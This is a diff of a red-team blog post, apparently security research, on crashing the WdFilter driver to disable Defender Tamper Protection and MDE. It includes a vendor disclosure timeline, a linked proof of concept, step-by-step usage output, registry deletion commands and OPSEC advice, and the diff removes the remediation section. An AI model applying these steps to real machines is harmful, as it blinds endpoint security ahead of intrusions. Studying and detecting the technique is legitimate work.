@@ -1,6 +1,6 @@
 ---
 title: Disabling Tamper Protection and other Defender / MDE components 
-date: 2024-04-08 09:48:47 +07:00
+date: 2024-04-10 09:48:47 +07:00
 categories: RedTeaming
 #modified: 20-08-29 09:24:47 +07:00
 #tags: [blog, netlify, jekyll, github]
@@ -11,7 +11,7 @@ description: Crashing WdFilter to disable Tamper Protection and other Defender /
 
 ## Disclosure Timeline
 
-- Sep 23, 2022 - Initial discovery
+- Sep 23, 2022 - Initial discovery.
 - Jan 05, 2024 - Reported with POC through MSRC portal.
 - Jan 11, 2024 - MSRC team confirmed. MSRC ticket was moved to Review / Repro.
 - Mar 07, 2024 - MSRC status was changed to Complete stating "unable to reproduce this issue."
@@ -19,7 +19,11 @@ description: Crashing WdFilter to disable Tamper Protection and other Defender /
 
 ## Platform
 
-This vulnerability, as of this writing affects updated versions of Windows server 2022, Windows 10 and Windows 11 until BuildLabEx Version: 22621.1.amd64fre.ni_release.220506-1250 (Win11 22H2 22621.1105 - Sep 2023 update). 
+This vulnerability, in my testing affects the following versions of Windows:
+- Windows Server 2022 until BuildLabEx Version: 20348.1.amd64fre.fe_release.210507-1500 (April 2024 update)
+- Windows 10 until BuildLabEx Version: 19041.1.amd64fre.vb_release.191206-1406 (April 2024 update)
+- Windows 11 until BuildLabEx Version: 22621.1.amd64fre.ni_release.220506-1250 (Sep 2023 update). 
+
 Even though Windows Server 2019 doesn't support Tamper Protection, the POC can still be leveraged to disable Defender / MDE.
 
 ## Summary
@@ -121,7 +125,7 @@ SeLockMemoryPrivilege                     Lock pages in memory                  
 [snip]
 ```
 
-Upon attempting to execute the reg.exe command to delete the "Altitude number" associated with the WdFilter driver, it was confirmed that the operation was successful.
+Upon attempting to execute the reg.exe command to delete the "Altitude number" regkey associated with the WdFilter driver, it was confirmed that the operation was successful.
 
 ```
 C:\Tools\NSudo_8.2_All_Components\NSudo Launcher\x64> reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WdFilter\Instances\WdFilter Instance" /v Altitude /f
@@ -185,15 +189,15 @@ The attack chain can be summarized as follows:
 
 ## Proof of Concept
 
-A POC has been included, written in C++ called Disable-TamperProtection can be found on GitHub here: <https://github.com/m3rcer/Disable-TamperProtection>
+A POC has been included, called Disable-TamperProtection which can be found on GitHub here: https://github.com/m3rcer/Disable-TamperProtection
 
 *NOTE: VC_redist.x64.exe could be required on the target.*
 
-Required elevated privileges to perform the attack have been incorporated in the POC by borrowing Code from the [superUser](https://github.com/mspaintmsi/superUser) project codebase for TrustedInstaller privilege impersonation. 
+Required elevated privileges to perform the attack have been incorporated in the POC by using the superUser project codebase as a reference for TrustedInstaller privilege impersonation. 
 
-POC Demo: <https://www.youtube.com/watch?v=aGTrjDxMSdU>
+POC Video Demo: https://www.youtube.com/watch?v=aGTrjDxMSdU
 
-The POC works in 3 steps:
+The POC works in 3 steps (Admin privileges required):
 
 ```
 C:\Users\User\Desktop> .\Disable-TamperProtection.exe
@@ -204,7 +208,7 @@ Sequential Usage: 1 --> 2 --> 3
 4:      Restore AV/MDE settings
 ```
 
-An example, to use this POC is as follows:
+An example, to use the POC is as follows:
 
 1) Unload WdFilter:
 
@@ -216,6 +220,7 @@ C:\Users\User\Desktop> .\Disable-TamperProtection.exe 1
 [+] Created process ID: 3744 and assigned additional token privileges.
 [+] Execute option 1 to validate!
 
+# Upon 2nd execution if the above output repeats the target isn't vulnerable
 C:\Users\User\Desktop>.\Disable-TamperProtection.exe 1
 [+] WdFilter Altitude Registry key has been successfully deleted.
 [+] Enumerating WdFilter information:
@@ -223,7 +228,7 @@ C:\Users\User\Desktop>.\Disable-TamperProtection.exe 1
 [+] Restart the system or wait a few minutes for WdFilter to unload.
 [+] Execute option 1 to validate!
 
-# Restart or wait a few minutes to crash and unload WdFilter
+# Restart to crash and unload WdFilter
 C:\Users\User\Desktop>.\Disable-TamperProtection.exe 1
 [+] WdFilter Altitude Registry key has been successfully deleted.
 [+] WDFilter has been successfully unloaded, use option 2 to disable Tamper Protection.
@@ -240,7 +245,7 @@ C:\Users\User\Desktop>.\Disable-TamperProtection.exe 2
 [+] Use option '3' to finally Disable AV/MDE.
 ```
 
-3) Disable Defender / MDE:
+3) Disable Defender / MDE components:
 
 ```
 C:\Users\User\Desktop>.\Disable-TamperProtection.exe 3
@@ -253,14 +258,14 @@ C:\Users\User\Desktop>.\Disable-TamperProtection.exe 3
 
 *NOTE: Even though Tamper Protection is effectively disabled now, it takes a reboot to render the same change in the "Security Settings" GUI Prompt.*
 
-The POC manages to semi-permanently disable Real time monitoring (gray out) after Tamper Protection is disabled. This can be remediated using option 4.
+The POC manages to semi-permanently disable Real time monitoring (grey out) after Tamper Protection is disabled. This can be remediated using option 4.
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020240311143923.png)
 
-4) Optionally reinstate the WdFilter minidriver, TamperProtection and Defender Settings (RealTimeMonitoring) utilizing option 4. Make sure to change the Altitude number (Default: 328010) back to it's original value at line 530 in the POC.  
+4) Reinstate / restore the WdFilter minidriver, TamperProtection and Defender Settings (Real-Time). Make sure to change the Altitude number (Default: 328010) back to it's original value at line 530 in the POC.  
 
 ```
-# Restart the computer to restore settings successfully
+# Restart the computer after execution to restore settings successfully
 C:\Users\User\Desktop>.\Disable-TamperProtection.exe 4
 [+] WdFilter Altitude Registry key has been successfully deleted.
 [+] Make sure to change Altitude in Source (Default: 328010) and reboot computer after execution.
@@ -277,18 +282,18 @@ The CodeBase in the Disable-TamperProtection POC can be altered to disable speci
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020231227155027.png)
 
-An example to chain / add parts to disable more than one component together is yet again showcased in comments at line 382. Uncomment these lines and replace in accordance.
+An example to chain / add parts to disable more than one component together is yet again showcased in comments at line 382.
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020231227155153.png)
 
 ## Impact against MDE
 
-Testing the exploit POC against a target Windows machine (Server 2022, Win10 and Win11 until Win11 22H2 22621.1105) with MDE enabled, it is found that Tamper Protection can successfully be disabled along with other Defender settings with little noise.
+Testing the POC against a target Windows machine as mentioned with MDE enabled, it is found that Tamper Protection can successfully be disabled along with other Defender settings.
 
 ## Detection and Alerts
 
 Alerts and detections can be used to build basic telemetry and detections for this attack.
-Testing the POC with latest Windows Defender Signatures as of this writing resulted in no detections. Testing the POC with MDE enabled results in whitelisted execution with the following alerts raised.
+Testing the POC with MDE enabled results in successful execution with the following alerts raised.
 
 **Alert 1:** Suspicious process reparenting detected: This alert is generated when a process is spawned under TrustedInstaller to gain its privileges.
 
@@ -319,7 +324,7 @@ C:\Tools\NSudo_8.2_All_Components\NSudo Launcher\x64> reg add "HKLM\SYSTEM\Curre
 The operation completed successfully.
 ```
 
-Reboot the computer to make the changes effective. The WdFilter minidriver is restored back to it's original state, leaving Tamper Protection and Real-Time Protection still disabled. This improves the attacks overall OPSEC avoiding the above-mentioned Event ID.
+Reboot the computer to make the changes effective. The WdFilter minidriver is restored back to it's original state, leaving Tamper Protection and Real-Time Protection still disabled. This improves the overall OPSEC avoiding the above-mentioned Event ID.
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020221124190217.png)
 
@@ -343,22 +348,21 @@ PS C:\Users\Administrator> Set-MpPreference -DisableRealtimeMonitoring $false
 PS C:\Users\Administrator> Set-MpPreference -DisableIOAVProtection $false
 ```
 
-The Proof of Concept (POC) incorporates functionality to reinstate the WdFilter minidriver, Tamper Protection and Defender settings based on this concept.
+The Proof of Concept (POC) incorporates functionality to reinstate the WdFilter minidriver, Tamper Protection and Defender settings (Real-Time protection) based on this concept using option 4.
 
 ![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020221124191854.png)
 
-## Remediation
-
-To remediate this vulnerability, avoid permitting TrustedInstaller privileges to alter and delete the `HKLM\SYSTEM\CurrentControlSet\Services\WdFilter\Instances\WdFilter Instance\Altitude` registry key. 
-A safer and a more favorable measure would be to protect all Defender registry keys subject to alteration using SYSTEM / TrustedInstaller privileges as patched in Windows 11 above BuildLabEx Version: 22621.1.amd64fre.ni_release.220506-1250 (Win11 22H2 22621.1105).
-
-## Credits
+## Credits and References
 
 - [Sektor7's evasion course](https://institute.sektor7.net/rto-win-evasion)
 - [NSudo](https://github.com/M2Team/NSudo/releases)
 - [superUser](https://github.com/mspaintmsi/superUser)
 - [Research paper on Blinding Defender](https://arxiv.org/ftp/arxiv/papers/2210/2210.02821.pdf)
 - [MDEInternals by FalconForce](https://www.first.org/resources/papers/conf2022/MDEInternals-FIRST.pdf)
+
+
+
+
 
 
 
